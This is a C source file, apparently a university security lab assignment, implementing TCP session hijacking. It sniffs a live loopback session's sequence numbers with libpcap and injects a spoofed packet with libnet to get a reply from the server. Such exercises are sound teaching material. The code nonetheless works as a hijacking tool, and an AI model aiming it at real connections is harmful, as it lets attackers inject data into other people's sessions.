/*****************************************************************
 * File: hijack.c
 * by: Group YaKeXi
 * 
 * History:
 * 
 *  2010/02/22 Completed and tested by Hongkai Xing 
 *             on Ubuntu 9.10 with libnet 1.1.4 and libpcap 0.8.
 *
 * Description: Sniffs a packet from a live tcp session and forges
 *              a fake tcp message from it. Then sends the forged
 *              packet to the server and obtain its reply.
 *
 *****************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <resolv.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <pcap.h>
#include <libnet.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h> 
#include <net/ethernet.h>
#include <netinet/ether.h> 


#define BUFSIZE         1600
#define MESSAGE_FORMAT  "O kind server, %s needs your blessings."

#ifndef ETHER_HDRLEN
#define ETHER_HDRLEN 14
#endif

pcap_t *set_cap_dev(char *, char *); /* set capdev up to capture dns    */
int analyze_packet(const u_char *, const char *andrew_id); /* parse a packet, build an answer */
void print_tcp_packet(const u_char *packet);

void showErrorMsg(char *msg)
{
        perror(msg);
        exit(1);
}

int usage() {
	printf("USAGE:\n");
	printf("\tsudo ./hijack <client ip> <client port> \
				<server ip> <server port> <andrew_id>\n");
	return -1;
}

int main(int argc, char **argv) {
	char *device="lo";		// device name in string
	char filter[1024];              // Capture filter string
//	char errbuf[PCAP_ERRBUF_SIZE];  // Error Buffer
	pcap_t* capdev;                 // Packet Capture Handler
	const u_char *packet = NULL;	
	struct pcap_pkthdr pcap_hdr;    // Pcap packet header

	/* loopback interface has been specified.*/
//	device = pcap_lookupdev(errbuf);// get the name of a network device
//	if (device == NULL) {
//		printf("pcap_lookupdev: %s\n", errbuf);
//	exit(1);
//	}

	if (argc != 6) usage();		// show usage

	int srvPort = atoi(argv[4]);	// get server's port number in integer
	int cliPort = atoi(argv[2]);	// get client's port number in integer

	/* Consturct a filter which capture the ACK packet from server to client */
	sprintf(filter,"(tcp src port %d) && (tcp dst port %d) && (tcp[13] & 16 != 0) && \
			(src host %s)     && (dst host %s)",srvPort,cliPort,argv[3],argv[1]);

	/* Setup for sniffering on Ethernet, compile and apply filter expression */
	capdev = set_cap_dev(device, filter);	
	printf("Sniffering on: %s\n", device);

	/* Intercept, craft and inject */
	while(1){
		packet = pcap_next(capdev,&pcap_hdr);	// intercept an specified packet
		if (packet == NULL) continue;
		// print_tcp_packet(packet);
		analyze_packet(packet,argv[5]);		// argv[5] == andrew_id
    		break;
 	}

  /**** read acknowledgement and reply from   ****/
  /**** the server and print the 'data' part  ****/
  /**** of the reply which should contain     ****/
  /**** your secret message.                  ****/

        struct ip *ip;        /* IP header */
        struct tcphdr *tcp;   /* TCP header */
        char *data;           /* Pointer to payload */
	int datalen;

	while(1){
		packet = pcap_next(capdev,&pcap_hdr);
	        ip = (struct ip *) (packet + ETHER_HDRLEN);
	        tcp = (struct tcphdr *) (packet + ETHER_HDRLEN + LIBNET_IPV4_H);
	        data = (char *)(packet + ETHER_HDRLEN + LIBNET_IPV4_H + LIBNET_TCP_H+12);
		datalen = strlen(data);
		printf("Server's Reply: %s\n",data);
		if (datalen > 0) break;		
	}

  pcap_close(capdev);

  return 0;
}


/* Basic setup for packet sniffing. You dont need to modify this. */
pcap_t *set_cap_dev (char *device, char *filter) {
	unsigned int network;           /* Filter setting */
	unsigned int netmask;           /* Filter setting */
	struct bpf_program fp;          /* Store compiled filter */
	pcap_t *capdev;                 /* Packet Capture Handler */
	char errbuf[PCAP_ERRBUF_SIZE];  /* Error buffer */

	pcap_lookupnet (device, &network, &netmask, errbuf);

	/* Open a network device for packet capture */
	if ((capdev = pcap_open_live(device, BUFSIZE, 1, 1000, errbuf)) == NULL) 
	{printf("pcap_open_live(): %s\n", errbuf);exit(1);}

	/* Make sure that we're capturing on an Ethernet device */
	if (pcap_datalink(capdev) != DLT_EN10MB) 
	{printf("%s is not an Ethernet\n", device);exit(1);}

	/* Compile the filter expression */
	if (pcap_compile(capdev, &fp, filter, 0, netmask) == -1) 
	{printf("Couldn't parse filter %s: %s\n", filter, pcap_geterr(capdev));exit(1);}
	
	/* Apply the compiled filter */
	if (pcap_setfilter(capdev, &fp) == -1) 
	{printf("Couldn't install filter %s: %s\n", filter, pcap_geterr(capdev));exit(1);}
	
	return capdev;
}

/*
void print_tcp_packet(const u_char *packet) {

	struct ip *ip;        // IP header
	struct tcphdr *tcp;   // TCP header
	char *data;           // Pointer to payload

	ip = (struct ip *) (packet + ETHER_HDRLEN);
	tcp = (struct tcphdr *) (packet + ETHER_HDRLEN + LIBNET_IPV4_H);
	data = (char *)(packet + ETHER_HDRLEN + LIBNET_IPV4_H + LIBNET_TCP_H);

	printf("TCP >>> [src]%s:%d\n", inet_ntoa(ip->ip_src),ntohs(tcp->source));
	printf("        [dst]%s:%d\n", inet_ntoa(ip->ip_dst),ntohs(tcp->dest));
	printf("        seq:%d,ack:%d\n", ntohl(tcp->seq),ntohl(tcp->ack_seq));
	
	return;
}
*/

/* Analyze a packet and store information */
int analyze_packet(const u_char *packet, const char *andrew_id) {

	libnet_t *l;    		// libnet handler/context
	libnet_ptag_t tcp_tag, ip_tag;	// libnet protocol tags
	char errbuf[LIBNET_ERRBUF_SIZE];// libnet error message buffer
	int inject_size;		// Number of bytes of injected packet

	struct ip *ip;			// ip header
        struct tcphdr *tcp;             // tcp header
	ip = (struct ip *) (packet + ETHER_HDRLEN);
        tcp = (struct tcphdr *) (packet + ETHER_HDRLEN + LIBNET_IPV4_H);

	/* construct payload string */
	char payload[100];			// payload string
	sprintf(payload, MESSAGE_FORMAT, andrew_id);
	int payload_size = strlen(payload);	// payload size in byte

	/* Extract seq, ack and other info from intercepted ACK packet */
	unsigned long new_ack = ntohl(tcp->seq);
	unsigned long new_seq = ntohl(tcp->ack_seq);
	unsigned short new_src_port_no = ntohs(tcp->dest);
	unsigned short new_dst_port_no = ntohs(tcp->source);
	unsigned short new_window = ntohs(tcp->window) + 1;

	/* Get a libnet handler and convert ip address format */
	l = libnet_init(LIBNET_RAW4, "lo", errbuf);
	if (l == NULL) showErrorMsg(errbuf);
        u_int32_t new_src_ip = libnet_name2addr4(l,inet_ntoa(ip->ip_dst),LIBNET_DONT_RESOLVE);
        u_int32_t new_dst_ip = libnet_name2addr4(l,inet_ntoa(ip->ip_src),LIBNET_DONT_RESOLVE);
	u_int16_t new_id = ntohs(ip->ip_id)+1;

	/* TCP header construction */
	tcp_tag = libnet_build_tcp(
		new_src_port_no,		// source port
		new_dst_port_no,		// destination port
		new_seq,			// sequence number
		new_ack,			// ackowledgement number
		0x18,				// control flags
		new_window,			// window sizee
		0,				// checksum
		0,				// urgent pointer
		LIBNET_TCP_H+payload_size,	// length of TCP packet
		(u_int8_t *)payload,		// crafted payload
		payload_size,			// payload length
		l,				// pointer to libnet context
		0);				// protocol tag = 0, build new
	if (tcp_tag == -1) {
		printf("Building TCP header failed: %s\n", libnet_geterror(l));
		return -1;
	}

	/* IP header construction */
	ip_tag = libnet_build_ipv4(
		LIBNET_IPV4_H+LIBNET_TCP_H+payload_size,// total length
		0,				// type of service
		new_id,				// identification number
		0,				// fragmentation offset
		64,				// time to live
		IPPROTO_TCP,			// upper layer protocol
		0,				// checksum
		new_src_ip,			// source IPv4 address
		new_dst_ip,			// destination IPv4 address
		NULL,				// no payload
		0,				// payload length
		l,				// pointer to libnet context
		0);				// protocol tag=0, build new
	if (ip_tag == -1) {
		printf("Building IP header failed: %s\n", libnet_geterror(l));
		return -1;
	}

	/*  Inject the packet */
	inject_size=libnet_write(l);
	if (inject_size == -1) {
		printf("Write failed: %s\n", libnet_geterror(l));
	}

	/*  Destroy the packet */
	libnet_destroy(l);
	return 0;
}

